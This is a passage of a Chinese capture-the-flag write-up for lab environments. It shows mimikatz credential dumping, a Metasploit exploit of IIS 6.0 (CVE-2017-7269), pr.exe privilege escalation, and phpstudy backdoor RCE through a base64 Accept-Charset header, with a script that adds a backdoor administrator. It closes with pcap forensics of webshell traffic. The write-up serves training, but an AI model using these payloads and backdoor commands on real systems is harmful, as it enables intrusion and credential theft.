pj1jND1710404906.png)\n\n然后以 **管理员权限** 打开mimikatz.exe\n\n输入 ```privilege::debug``` 提升权限，显示200 ok即成功\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/9UJsC1zqJCZ6EM2g1710404906.png)\n\n使用 ```sekurlsa::logonpasswords``` 获取账号密码信息\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/XQHyQfyZJMpbgiww1710404906.png)\n\n如果出现这样的报错就是权限不足，没打privilege::debug 或 管理员权限运行\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/uIoGNeE3gTpyJRua1710404907.png)\n\n用 **lsadump::sam **也可以获取本机密码\n\n##### FLAG6: lsadump::sam\n\n#### 7. 通过本地PC中渗透测试平台win7对服务器场景Windows进行渗透测试，将sam文件与system文件提取到本地，使用桌面mimikatz工具提取administrators密码信息，将提取到的hash值作为FLAG提交;\n\n利用sam文件和system文件提取哈希：\n\n```\nlsadump::sam /sam:sam.hive /system:system.hive\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ihzChw3SFJMwYy6F1710404907.png)\n\n\n\n##### FLAG7: 6cfa9ce05f0afaa483beaea6567ea26e\n\n\n\n### Web服务器渗透测试 (CVE-2017-7269)\n\n**任务环境说明：**\n\nü 服务器场景名：PYsystem0014\n\nü 服务器场景操作系统：未知\n\nü 服务器场景用户名：（用户名：未知：密码；未知）\n\n*环境是磐云的P10 经典赛题-Windows操作系统渗透测试\n\n#### 1.使用命令zenmap打开nmap图形化扫描工具，采用webdav扫描，将使用的—script参数值作为Flag值提交；\n\nzenmap和nmap差不多\n\n```\nnmap --script http-webdav-scan -sV 10.140.98.234\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/YrlPvr4kOQm6OtYQ1710404907.png)\n\n#####  FLAG1: http-webdav-scan\n\n#### 2.将上述扫描结果中的80端口使用的Server Type值作为Flag值进行提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ZOQJt1yUY3QVRpK01710404907.png)\n\n#####  FLAG2: Microsoft-IIS/6.0\n\n#### 3.使用msfconsole命令打开metasploit漏洞测试平台，使用search命令搜索cve_2017_7269，将查找到的模块名称作为Flag值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/n6Nzj4hC9XiEGj8u1710404907.png)\n\n#####  FLAG3: exploit/windows/iis/cve_2017_7269\n\n#### 4.使用use命令利用该模块，同时使用show options命令来查看需要配置的参数，设置有效攻击的载荷,将有效攻击名称作为Flag值进行提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/cPeoAYrddaRQEUBY1710404907.png)\n\n#####  FLAG4: windows/meterpreter/reverse_tcp\n\n#### 5.执行exploit溢出攻击模块，成功获取到目标靶机的meterpreter权限,使用命令whomai查看当前用户权限，将返回的权限结果作为Flag进行提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/jbAzpOD9HyargFng1710404908.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/j1oejG4wGG5ynqmS1710404908.png)\n\n#####  FLAG5: nt authority\\network service\n\n#### 6.找到具有创建权限的路径，新建test目录，然后返回到meterpreter，上传攻击机中的提权工具pr.exe到test目录中，将上传使用的命令作为Flag进行提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JUBkWvf2fOvZIVyn1710404908.png)\n\n#####  FLAG6: upload /root/pr.exe c:\\\\\\test\n\n#### 7.回到shell中确认工具是否上传成功，使用pr.exe进行提权，执行whoami命令,将返回结果的最后一行作为Flag进行提交；\n\n```\ncd c:\\test\npr.exe \"whoami\"\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Wvw0gUaZadd4RZuJ1710404908.png)\n\n##### FLAG7: nt authority\\system\n\n#### 8.查看用户Administrator的“My Documents”目录中show.txt文件，将该文件中的内容作为Flag进行提交。\n\n建立后门用户：\n\n```\npr.exe \"net user hacker 123456 /add\"\npr.exe \"net localgroup administrators hacker /add\"\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/qISEPTpEg2u3ksG81710404908.png)\n\n再上传3389.bat\n\n```\nupload /root/3389.bat c:\\\\test\n```\n\n然后利用pr.exe运行3389.bat，远程连接做题即可。\n\n```\npr.exe \"call 3389.bat\"\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/VbHRfTrp7Op2TDjU1710404908.png)\n\n找到`C:\\Documents and Settings\\Administrator\\My Documents`目录查看文件即可。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/A91VFV6B2EM7fIeJ1710404909.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Bj3OLIBW9oYTcfXk1710404909.png)\n\n##### FLAG8: I See You\n\n\n\n### *中间件渗透测试（phpstudy后门）\n\n**任务环境说明：**\n\nü 服务器场景：Server2129（关闭链接）\n\nü 服务器场景操作系统：Windows\n\n#### 1.  通过本地PC中渗透测试平台Kali对服务器场景Server2129进行系统服务及版本扫描渗透测试，并将该操作显示结果中80端口对应的服务状态信息作为Flag值提交； \n\n![](http://cdn.anyiblog.top/WriteUp/20240314/kVgdWXAqCDcRgbwt1710404909.png)\n\n##### FLAG1: open\n\n#### 2.  获取靶机Server2129系统中以英文“P”开头的用户名，并将该用户名作为Flag值提交；\n\n这里开放了80端口，所以用dirb扫描下路径。\n\n```\ndirb http://192.168.31.205\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Ilh7bBkDZxUT7yf51710404909.png)\n\n有一个phpinfo.php和phpmyadmin，先看phpinfo.php找一些信息。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/KSUJ59L1CROBKVou1710404909.png)\n\n我们找到了其网站根目录，并且能发现是 **phpstudy** 搭建的网站\n\n结合 中间件渗透 以及 2019年发布的phpstudy 0day漏洞 利用方式 **只需在请求头加入 Accept-Charset: base64编码的php payload 并且Accept-Encoding: gzip,deflate 两者之间没有空格 即可成功RCE执行漏洞** \n\n任意访问一个网页，这里我选的根目录，payload是 **system('net user');**\n\n**1.抓取请求，添加请求头：**\n\n先将payload转换成base64 -> ![](http://cdn.anyiblog.top/WriteUp/20240314/drV5Qw9GeXSoc9vH1710404910.png)\n\n将编码后的字符串添加在 **Accept-Charset** 后面\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/U39WaODfBsGt0cLj1710404910.png)\n\n**2.修改gzip和deflate之间的空格：**\n\n这里之间有空格，去掉即可\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/PszYKqBG3qUANGUR1710404910.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/KxnruppShX1t9WJQ1710404910.png)\n\n\n\n**3.发送请求，成功命令执行：**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Atd42WCoqhde7qI11710404910.png)\n\n成功执行了，那么我们现在创建后门用户并添加至管理组即可。后面的题目没用到admin管理员，直接改管理员账号密码也可以。\n\n```python\nimport base64\n\npayload = 'chcp 65001 & net user hacker 123456 /add & net localgroup administrators hacker /add' \nres = base64.b64encode(f\"system('{payload}');\".encode()).decode()\nprint(res)\n\n#c3lzdGVtKCdjaGNwIDY1MDAxICYgbmV0IHVzZXIgaGFja2VyIDEyMzQ1NiAvYWRkICYgbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgaGFja2VyIC9hZGQnKTs=\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ZD6ukryjM2HZ8YSp1710404911.png)\n\n刚刚扫描的结果中可以看到3389端口是开放的，所以直接连接即可。\n\n（这里由于环境问题，所以还需在镜像内修改远程为 **允许运行任何版本远程桌面的计算机连接** 才可以正常连接）：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/VLlfASxV0zRDYqvt1710404911.png)\n\n然后mstsc连接，做题即可。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lWuCtLTvXGODBB8i1710404911.png)\n\n##### FLAG2: Pyseclabs2022\n\n#### 3.  找到靶机Server2129的网络适配器信息，将首选DNS服务器地址作为Flag值提交；\n\n```\nipconfig /all\n```\n\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/iT9VMu0cOI8UkjuT1710404911.png)\n\n##### FLAG3: 114.115.115.114\n\n#### 4.  找到靶机Server2129中桌面上111文件夹中后缀为.docx的文件，将文档内容作为Flag值提交；\n\n修改管理员密码，使用管理员登录。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/WqBRfeIEIdA9mxes1710404912.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/w5IBMgylO1aLQOCs1710404912.png)\n\n这里电脑没有相关的打开工具，远程可以直接cv，下载到本地打开即可。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/XIbmTOrqWIeIKVEP1710404912.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/HPB0D3fbIss0mE7B1710404912.png)\n\n##### FLAG4: cnuewnafdjmqwe\n\n#### 5.  找到靶机Server2129中回收站内的文档，将文档内容作为Flag值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/zeyzN96hQ8gioqKL1710404912.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/n0prz4sXSobD0JOB1710404913.png)\n\n##### FLAG5: cnuewnafdjmqwe\n\n#### 6.  找到靶机Server2129中的C:\\flag.txt文件，将文件的内容作为Flag值提交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/v3yBK44kdvcNdrTv1710404913.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/9GtATkZZJOOmqGQ11710404913.png)\n\n##### FLAG6: werverstartednrt\n\n\n\n##### \n\n## 数据包分析\n\n\n\n### Wireshark数据包分析（wireshark0051.pcap）\n\n任务环境说明：\n\t服务器场景：FTPServer220223\n\t服务器场景操作系统：未知（关闭连接）\n\tFTP用户名：wireshark0051密码：wireshark0051\n\n#### 1.从靶机服务器的FTP上下载wireshark0051.pcap数据包文件，找出黑客获取到的可成功登录目标服务器FTP的账号密码，并将黑客获取到的账号密码作为Flag值（用户名与密码之间以英文逗号分隔，例如：root,toor）提交；\n\n​\t**找出黑客获取到的可成功登录目标服务器FTP的账号密码** 说明了是ftp服务\n\n​\t所以这里我们用contains筛选带有success的响应（登录成功）\n\n```\nftp contains \"success\" //筛选带有success响应的ftp包\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Y5MdJaUhtO8Jm47B1710404913.png)\n\n然后追踪流得到账号密码：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/i20jvh0RnwIszuJi1710404913.png)\n\n##### \tFLAG1: admin,admin654321\n\n#### 2.继续分析数据包wireshark0051.pcap，找出黑客使用获取到的账号密码登录FTP的时间，并将黑客登录FTP的时间作为Flag值（例如：14:22:08）提交；\n\n​\t![](http://cdn.anyiblog.top/WriteUp/20240314/Ss1gZdcet5QtvzzT1710404914.png)\n\n#####\tFLAG2: 01:33:08\n\n#### 3.继续分析数据包wireshark0051.pcap，找出黑客连接FTP服务器时获取到的FTP服务版本号，并将获取到的FTP服务版本号作为Flag值提交；\n\n​\t![](http://cdn.anyiblog.top/WriteUp/20240314/a3mxNzTEBNFO2OM31710404914.png)\n\n#####\tFLAG3: 3.0.2\n\n#### 4.继续分析数据包wireshark0051.pcap，找出黑客成功登录FTP服务器后执行的第一条命令，并将执行的命令作为Flag值提交;\n\n​\t![](http://cdn.anyiblog.top/WriteUp/20240314/xFsgrdcwnba8xp3Q1710404914.png)\n\n​\tFTP里list会显示当前目录文件，相当于windows的 **dir** 命令\n\n#####\tFLAG4: dir\n\n#### 5.继续分析数据包wireshark0051.pcap，找出黑客成功登录FTP服务器后下载的关键文件，并将下载的文件名称作为Flag值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/bDQfLIAfyFXvszte1710404914.png)\n\n#####\tFLAG5: flag123\n\n#### 6.继续分析数据包wireshark0051.pcap，找出黑客暴力破解目标服务器Telnet服务并成功获取到的用户名与密码，并将获取到的用户名与密码作为Flag值（用户名与密码之间以英文逗号分隔，例如：root,toor）提交；\n\n​\t与ftp过滤规则一样，筛选telnet的就好\n\n```\ntelnet contains \"success\"\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/MYlzGf9J9PH0YN5M1710404914.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/h4MMIaPnyZHeA4X91710404914.png)\n\n#####\tFLAG6: root,toor654321\n\n#### 7.继续分析数据包wireshark0051.pcap，找出黑客在服务器网站根目录下添加的文件，并将该文件的文件名称作为Flag值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ObNRTqByZ3nFLKj51710404915.png)\n\n#####\tFLAG7: admin654321\n\n#### 8.继续分析数据包wireshark0051.pcap，找出黑客在服务器系统中添加的用户，并将添加的用户名与密码作为Flag值（用户名与密码之间以英文逗号分隔，例如：root,toor）提交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/dhIMCzHkrmKZfx341710404915.png)\n\n#####\tFLAG8: user123,123456\n\n\n\n### *隐藏信息探索（B.pcapng）\n\n任务环境说明：\n\t渗透机场景：windows7\n\t渗透机用户名：administrator密码：123456\n\n#### 1.  通过分析数据包B.pcapng，找到数据库里的flag最后一个字符是什么，将该字符作为FLAG提交；\n\n打开数据包，发现是http流量分析，那么直接过滤flag字符串。\n\n ```\nhttp contains \"flag\"\n ```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/DYbQG0OfvLlxF12z1710404915.png)\n\n发现是sql盲注流量，这种需要看响应包对应的ascii码，再转换成字符串。一般来说flag的最后一个字符都是 **}** 这边找一下即可。\n\n在 **250520** 号流量找到了最后一次带有flag的sql请求：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/iQANihn4VG5DFoot1710404915.png)\n\n将ascii码转成字符串，得到字符串 **}** \n\n##### FLAG1: }\n\n#### 2.  通过分析数据包B.pcapng，找到黑客扫描到的主机IP是多少将该IP作为FLAG提交；\n\n 这里有两种解法：\n\n- 使用过滤语句筛选出IP\n\n```\ntcp.flags.reset==1\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/k412aaIf7pMtUJ5W1710404915.png)\n\n除去http看见的192.168.10.128 和 192.168.10.1 这里扫描出的就是192.168.10.12\n\n- 分析后面黑客做的操作，溯源可以找到IP\n\n这里的做法要先做后面几题，因为在后面几题中黑客使用了python脚本来扫描网段，并将扫描结果存储至log.txt，此时分析该文件就能找到扫描到的IP\n\n在 **280459** 号流量中找到该log.txt的记录：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/qWC724ddSIxnEqcO1710404916.png)\n\n##### FLAG2: 192.168.10.12\n\n#### 3.  通过分析数据包B.pcapng，找到服务器的内核版本是多少，将该版本信息作为FLAG提交;\n\n一般拿到内核版本就是拿到shell了， 先分析黑客干了啥\n\n结合后面题目提到了上传了一句话木马，所以这里过滤规则可以这样过滤：\n\n```\nhttp contains \"<?php\"\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/LYJIR4rPT01W18w31710404916.png)\n\n有一号流量内容是文件上传，那么很可能就是从这里上传的木马 追踪过去看看\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/VNJG2oC7IUg6okFZ1710404916.png)\n\n果然找到了一句话木马的名字，名为 **m.php** 接下来过滤这个名字就好了\n\n```\nhttp contains \"/m.php\" //这里加个 / 是因为这个文件肯定是在一个路径下的，所以这样能筛选掉大部分带有 m.php 的无效请求\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/NS7QVNrmXE5Ew34n1710404916.png)\n\n筛选结果中看到一堆**POST**的请求，十分可疑。跟进发现了是 **蚁剑流量** 的特征\n\n追踪第一个POST请求，发现了响应包含了内核版本的信息：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/9FTi34C2I6JYXXGL1710404916.png)\n\n##### FLAG3: 3.10.0-123.el7.x86_64\n\n#### 4.  通过分析数据包B.pcapng，找到黑客扫描网段的命令是什么？，将该命令作为FLAG提交;\n\n 上面我们通过分析找到了该木马进行了蚁剑连接，那么执行的操作也会在那一堆蚁剑流量中。\n\n因为后面的操作一定是基于webshell来执行的，所以我们只要仔细分析这些蚁剑流量即可。\n\n蚁剑流量分析：\n\n一般来说会传1-3个参数，z0一般都是固定的，重点是z1 和 z2这些参数\n\n比如说该流量中，z1字符串传参了一个base64字符串，解密能发现是一个路径，那就说明是查看了该目录的文件\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/NHAwHeXg4baxcFBU1710404916.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/u4LKHWY3HtkRqa9B1710404917.png)\n\n响应包中也符合结果：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/yRkLFwiMr8DqTpry1710404917.png)\n\n那么知道了怎么分析后，我们再一个个去找蚁剑流量，最后在 **278710** 号流量找到了关键\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/mIk1vLkF23oNQx1q1710404917.png)\n\n```\n\"z1\":L2Jpbi9zaA==\n\"z2\":Y2QgIi92YXIvd3d3L2h0bWwvdXBsb2Fkcy8iO3B5dGhvbiBSQVNzY2FuLnB5IDE5Mi4xNjguMTAuMTAgMTkyLjE2OC4xMC4xMTAgLXQgMjAgPiBsb2cudHh0O2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ==\n```\n\n这里传了两个参数，先看z1的解密结果：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/z6mRXV7FY29r6QPX1710404917.png)\n\n很明显，z1传了一个/bin/sh就是命令执行的意思，那么z2很可能就是执行的命令。\n\n解密z2的内容，发现了黑客执行的命令，那么扫描网段的命令就是红框的部分：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/eMsKNfeK1WWrGiIh1710404918.png)\n\n##### FLAG4: python RASscan.py 192.168.10.10 192.168.10.110 -t 20 > log.txt\n\n#### 5.  通过分析数据包B.pcapng，找到黑客通过一句话木马上传的第一个文件是什么，将文件名作为FLAG提交；\n\n 这里结合标题，还是分析蚁剑流量\n\n需要注意的是，题目中说明了是**上传的第一个文件**，所以当我们筛选完流量后，**编号顺序要从小到大来排序**，再从上到下逐个分析。\n\n上传文件是要文件内容，所以关键参数**必定有2个及以上**，且**有一个参数会是文件内容的某种编码**，这里可以作为一种特征去寻找。\n\n在 **275579** 号流量中，找到了符合这样条件的流量：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Z201GPt9REJ64tdI1710404918.png)\n\nz1是文件名，z2是文件内容的16进制编码。\n\n解密z1内容得到文件名\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Sl7YWGHdPCeNoC2s1710404918.png)\n\n##### FLAG5: socks.py\n\n\n\n#### 6.  通过分析数据包B.pcapng，找到黑客从服务器上下载的文件，将文件内容作为FLAG提交；\n\n在 **274600** 号流量找到了一个压缩包文件，追踪该流看内容。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/pxgrPKnGfT04b6oL1710404918.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/xMvFLOCQgBh6qxZI1710404918.png)\n\n很明显下载的文件就是这个B.zip\n\n将保存数据改为原始数据，找到504B的部分，复制给新文件中。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/LZbLZAAgPevMrQaj1710404919.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/vOuaI21eSLjbyPco1710404919.png)\n\n保存，打开文件得到一个png文件\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2V8MhXKJERPJZtl71710404919.png)\n\n解压发现打不开，用winhex分析，发现少了图片头：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/OT5QcvcGOuyxQZGE1710404919.png)\n\n补充一个PNG的文件头至该文件起始处，不知道文件头是啥可以新建一个png图片查看。\n\n```\n89504E47 // PNG文件头\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2KJ4avixofODuLyh1710404919.png)\n\n保存，打开图片得到FLAG：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/6CxjMZThm4xdDJe11710404920.png)\n\n\n\n##### FLAG6: flag{asdafsv}\n\n\n\n### 流量分析（capture.pcapng）\n\n任务环境说明：\n\t服务器场景：Server09\n\t服务器场景操作系统：未知（关闭连接）\n\t系统用户名：administrator密码：123456\n\n#### 1.  使用Wireshark查看并分析靶机桌面下的capture.pcapng数据包文件，找到黑客的IP地址，并将黑客的IP地址作为Flag值（如：172.16.1.1）提交；\n\n```\ntcp.connection.syn\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ubCp7cMaUxxPBcm41710404920.png)\n\n##### FLAG1: 172.16.1.110\n\n#### 2.  继续分析capture.pcapng数据包文件，找出黑客通过工具对目标服务器的哪些服务进行了密码暴力枚举渗透测试，将服务对应的端口依照从小到大的顺序依次排列作为Flag值（如：77/88/99/166/1888）提交；\n\n```\ntcp.connection.syn and ip.src==172.16.1.110\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/WOiAfOpcH6eJ6opb1710404920.png)\n\n##### FLAG2: 21/22/23/80/3306\n\n#### 3.  继续分析capture.pcapng数据包文件，找出黑客已经获取到目标服务器的基本信息，请将黑客获取到的目标服务器主机名作为Flag值提交；\n\n```\n// 一般主机名在telnet连接中会显示出来，这里直接过滤telnet服务并追踪即可\ntelnet\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JCtYSVN4nSgUtIly1710404920.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/iIRV2ZFmjw9PbAph1710404920.png)\n\n##### FLAG3: SecTestLabs\n\n#### 4.  继续分析capture.pcapng数据包文件，找出黑客成功破解了哪个服务的密码，并将该服务的版本号作为Flag值(如：5.1.10)提交；\n\n一般来说过滤success服务即可，这里破解了ftp服务后又破解了mysql服务，这题是mysql的服务。\n\n```\ntcp contains \"success\" // 查找tcp流连接中带有 'success' 的流量\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/KBP9yTADMRRTCcDV1710404921.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/O4LvWWxC1O1BBivl1710404921.png)\n\n##### FLAG4: 5.7.26\n\n#### 5.  继续分析capture.pcapng数据包文件，黑客通过数据库写入了木马,将写入的木马名称作为Flag值提交（名称不包含后缀）；\n\n数据库流量，继续追踪mysql就好\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/QAhXBgxTsv2YTIyj1710404921.png)\n\n##### FLAG5: horse\n\n#### 6.  继续分析capture.pcapng数据包文件，黑客通过数据库写入了木马,将黑客写入的一句话木马的连接密码作为Flag值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/PZ1OkEroqTfEi8GX1710404921.png)\n\n##### FLAG6: lqsym\n\n#### 7.  继续分析capture.pcapng数据包文件，找出黑客连接一句话木马后查看了什么文件，将黑客查看的文件名称作为Flag值提交；\n\n过滤http流量中包含horse.php的流量\n\n```\nhttp contains \"horse.php\"\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/BzFIkbxFKJteoNL41710404922.png)\n\n这里在第 **11798** 号流量找到\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/r0184Aspx8ROOFeK1710404922.png)\n\n明显是/etc/passwd文件的内容\n\n##### FLAG7: passwd\n\n#### 8.  继续分析capture.pcapng数据包文件，黑客可能找到异常用户后再次对目标服务器的某个服务进行了密码暴力枚举渗透，成功破解出服务的密码后登录到服务器中下载了一张图片，将图片文件中的英文单词作为Flag值提交。\n\n这里爆破的是ftp服务。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/NhrXBsq7uU5eZCWl1710404922.png)\n\n下载了 **flag.jpg** 文件\n\n用 **ftp-data** 过滤再追踪可以找到文件内容\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/QXNJ87rTCZekl6hM1710404922.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/u99f49FnDQ5ngMTp1710404922.png)\n\n原始数据保存，打开图片得到flag\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/PyLgaXcFv3uDtNSv1710404922.jpg)\n\n##### FLAG8: harmony\n\n\n\n### *数据包分析（infiltration.pcapng）\n\n任务环境说明：\n\n  服务器场景：FServer0820\n\n  服务器场景操作系统：未知（关闭连接）\n\n  FTP用户名：infiltration密码：infiltration\n\n*本题先做后面的题目再做前面的题目会比较好做。\n\n#### 各IP之间的关系\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/54fVO7hXQrwv9Yjh1710404923.png)\n\n这题IP共有2个渗透机，1个靶机，1个恶意用户。\n\nIP 192.168.90.133 是恶意用户，分别连接了两台攻击机，对靶机进行渗透。\n\nIP 192.168.90.139 是恶意用户通过3389连接的windows攻击机。\n\n```\nip.src==192.168.90.133 and ip.dst==192.168.90.139\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/s6JgdgPS0DQvywVV1710404923.png)\n\nIP 192.168.90.138 是攻击机Kali。\n\nIP 192.168.90.132 是windows靶机。\n\n192.168.90.139除了连接靶机的telnet服务以外，还对靶机的http服务进行了渗透，上传一句话木马。\n\n#### 1.  登录FTP下载数据包文件infiltration.pacapng，找出恶意用户的IP地址，并将恶意用户的IP地址作为Flag（形式：[IP地址]）提交；\n\n参考了很多网上的文章，大多都是过滤后一眼就看出来。\n\n```\ntcp.connection.syn\n```\n\n但是这种找IP的题目，而且还是关系很复杂的情况，还得根据后面的题目来找比较准确。\n\n建议先做第三题，找到了密码后再溯源找到恶意用户。\n\n##### FLAG1: 192.168.90.133\n\n#### 2.  分析出恶意用户扫描了哪些端口，并将全部的端口作为Flag（形式：[端口名1，端口名2，端口名3…，端口名n]）从低到高提交；\n\n这题很巧的就是，攻击机使用了nmap扫描，并且在telnet服务中能发现它使用的命令。\n\n如果是常规的题目就用过滤规则找\n\n```\ntcp.connection.syn and ip.src==IP\n```\n\n这里还不确定就先做第三题。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/adOLU7zO4T95ysqH1710404923.png)\n\n第三题做完能发现这里其实**192.168.90.138是攻击机Kali，192.168.90.133是恶意用户，被爆破的靶机是192.168.90.132**\n\n分析得知，恶意用户连接了攻击机kali作为跳板机，并爆破靶机windows的账号密码。\n\n我们看看恶意用户了连接攻击机Kali还做了什么操作。既然使用了Hydra进行服务的爆破，那就说明先前通过扫描获取了有哪些开放端口，才做的进一步渗透。\n\n```\ntelnet and ip.src==192.168.90.133 and ip.dst==192.168.90.138\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/6qLHq5iJhYCa90tH1710404923.png)\n\n追踪第一个数据包：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/dTQ8KJBiocTk7R4C1710404923.png)\n\n能明显看到进行了nmap扫描，这个时候我们就已经知道扫描了哪些端口了。\n\n我们还可以找到使用的命令。查看恶意用户发送给攻击机的数据：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Ux5kZwLSjRmy2Fv11710404923.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/pFOM2czZ6LlDmqOD1710404924.png)\n\n```\nnmap -sV 192.168.90.132 -p 21,22,23,80,3389\n```\n\n能看到是对靶机进行了指定端口的详细服务扫描。\n\n##### FLAG2: [21,22,23,80,3389]\n\n#### 3.  恶意用户最终获得靶机的密码是什么，并将密码作为Flag（形式：[用户名]）；\n\n已知有 **http、telnet** 这些协议，那么获取靶机的密码一般是通过telnet爆破。\n\n因此这里我们使用过滤规则找到telnet爆破成功的数据包：\n\n```\ntelnet contains \"success\"\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Kn3pyYiWm4ts4dof1710404924.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/m9H7V1Rk0Xv7viNZ1710404924.png)\n\n追踪后发现有密码，但是这个密码并不是答案，要注意看显示的是 **kali** 所以这里应该还是攻击机的账号密码。\n\n查找字符串success，找到了这段信息：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/p1Bs6U1De5frGCXN1710404924.png)\n\n攻击机使用了 hydra 爆破了靶机的密码，并爆破出了密码，所以这里正确的密码是 **YwQgj8eN**\n\n##### FLAG3: YwQgj8eN\n\n#### *4.  找出目的不可达的数据数量，并将目的不可达的数据数量作为Flag（形式：[数字]）提交；\n\n过滤不可达数据流量包规则：(这个要记)\n\n```\nicmp.type==3\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/wTf69fIAxqYGe1rX1710404924.png)\n\n这些就是不可达的数据包了，那我们还要知道这些数据包的总量。\n\n此时点开 **统计 -> 捕获文件属性（Ctrl+Shift+Alt+C）**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/MtyZt2vheDemkoUC1710404925.png)\n\n在分组一栏的已显示中找到了数据包总量为 **154**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ajfQ9DL63NFP5e6c1710404925.png)\n\n##### FLAG4: 154\n\n#### 5.  分析出恶意用户使用的最后一个一句话木马的密码是什么，并将一句话密码作为Flag（形式：[一句话密码]）提交；\n\n一句话木马特征就是 **eval(** 有eval才能执行，所以以这个为特征进行过滤\n\n```\nhttp contains \"eval(\"\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/MWAISjBbglT1LZjG1710404925.png)\n\n能看到结果中出现了/upload/ 目录，那就说明是通过文件上传传入的一句话木马。\n\n题目要求我们获取**最后一个一句话木马的密码**，那么追踪最后一个包 **158844** 即可\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/uYdeRRv2xW0w5ebB1710404925.png)\n\n木马freed.php 连接密码 **hope**\n\n##### FLAG5: hope\n\n#### 6.  分析出被渗透主机的服务器系统OS版本全称是什么是，并将OS版本全称作为Flag（形式：[服务器系统OS版本全称]）提交；\n\n根据第三题，此时恶意用户拿到了靶机的账号密码，肯定会使用telnet去连接靶机。\n\n由于不确定恶意用户是直接连接，还是使用攻击机连接，所以只过滤目标IP 192.168.90.132 